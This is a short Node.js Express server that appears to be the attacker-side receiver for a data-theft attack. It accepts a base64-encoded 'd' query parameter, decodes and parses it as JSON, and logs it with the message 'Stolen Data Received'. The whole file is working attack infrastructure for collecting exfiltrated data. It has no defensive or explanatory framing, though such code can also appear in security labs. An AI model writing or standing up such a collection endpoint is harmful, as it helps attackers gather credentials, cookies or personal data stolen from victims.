const express = require('express');
const atob = require('atob');

const app = express();

app.get('/', (req, res) => {
  const data = req.query.d;
  const decodedPayload = atob(data);
  const actualPayload = JSON.parse(decodedPayload);
  console.log(`Stolen Data Received at ${new Date().toTimeString()}`);
  console.log(actualPayload);
  res.send();
});

app.listen(8000, () => console.log('API listening for data on port 8000'));
